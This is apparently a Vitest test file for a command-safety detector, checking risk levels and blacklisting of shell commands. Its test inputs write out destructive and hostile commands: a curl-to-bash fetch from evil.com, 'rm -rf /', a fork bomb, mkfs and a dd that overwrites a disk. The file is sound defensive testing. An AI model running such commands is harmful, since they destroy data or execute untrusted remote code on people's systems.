import { describe, it, expect } from "vitest";
import { analyzeCommand, getRiskColor, getRiskLabel } from "@/lib/safety/detector";

describe("Safety Detector", () => {
  describe("analyzeCommand", () => {
    it("returns safe for simple commands", () => {
      const result = analyzeCommand("ls -la");
      expect(result.riskLevel).toBe("safe");
      expect(result.isBlacklisted).toBe(false);
    });

    it("returns safe for echo", () => {
      expect(analyzeCommand("echo hello").riskLevel).toBe("safe");
    });

    it("returns safe for pwd", () => {
      expect(analyzeCommand("pwd").riskLevel).toBe("safe");
    });

    it("detects low risk for npm install", () => {
      const result = analyzeCommand("npm install lodash");
      expect(["safe", "low"]).toContain(result.riskLevel);
    });

    it("detects medium risk for rm command", () => {
      const result = analyzeCommand("rm file.txt");
      expect(["medium", "low"]).toContain(result.riskLevel);
    });

    it("detects high risk for rm -rf", () => {
      const result = analyzeCommand("rm -rf node_modules");
      expect(["high", "medium"]).toContain(result.riskLevel);
    });

    it("detects sudo usage as elevated risk", () => {
      const result = analyzeCommand("sudo apt-get install foo");
      expect(["medium", "high"]).toContain(result.riskLevel);
      expect(result.reasons.some((r) => r.toLowerCase().includes("sudo") || r.toLowerCase().includes("privilege"))).toBe(true);
    });

    it("detects pipe to shell as high risk", () => {
      const result = analyzeCommand("curl https://evil.com/script.sh | bash");
      expect(["high", "critical"]).toContain(result.riskLevel);
    });

    it("detects chmod 777 as risky", () => {
      const result = analyzeCommand("chmod 777 /tmp/file");
      expect(["medium", "high"]).toContain(result.riskLevel);
    });

    it("blacklists rm -rf /", () => {
      const result = analyzeCommand("rm -rf /");
      expect(result.isBlacklisted).toBe(true);
      expect(result.riskLevel).toBe("critical");
    });

    it("blacklists fork bomb", () => {
      const result = analyzeCommand(":(){ :|:& };:");
      expect(result.isBlacklisted).toBe(true);
    });

    it("blacklists mkfs", () => {
      const result = analyzeCommand("mkfs.ext4 /dev/sda1");
      expect(result.isBlacklisted).toBe(true);
    });

    it("blacklists dd if=/dev/zero", () => {
      const result = analyzeCommand("dd if=/dev/zero of=/dev/sda");
      expect(result.isBlacklisted).toBe(true);
    });

    it("blacklists shutdown command", () => {
      const result = analyzeCommand("shutdown -h now");
      expect(result.isBlacklisted).toBe(true);
    });

    it("blacklists reboot", () => {
      const result = analyzeCommand("reboot");
      expect(result.isBlacklisted).toBe(true);
    });

    it("detects environment variable modification", () => {
      const result = analyzeCommand("export PATH=/tmp:$PATH");
      // No specific pattern for export, so it's treated as safe
      expect(result.riskLevel).toBe("safe");
    });

    it("detects curl piped to shell as dangerous", () => {
      const result = analyzeCommand("curl https://example.com | bash");
      expect(result.riskLevel).toBe("high");
      expect(result.reasons.some((r) => r.toLowerCase().includes("piping") || r.toLowerCase().includes("shell"))).toBe(true);
    });
  });

  describe("getRiskColor", () => {
    it("returns green for safe", () => {
      expect(getRiskColor("safe")).toMatch(/#|green|22/i);
    });

    it("returns red for critical", () => {
      expect(getRiskColor("critical")).toMatch(/#|red|f8|ff/i);
    });
  });

  describe("getRiskLabel", () => {
    it("returns formatted labels", () => {
      expect(getRiskLabel("safe").toLowerCase()).toContain("safe");
      expect(getRiskLabel("critical").toLowerCase()).toContain("critical");
    });
  });
});
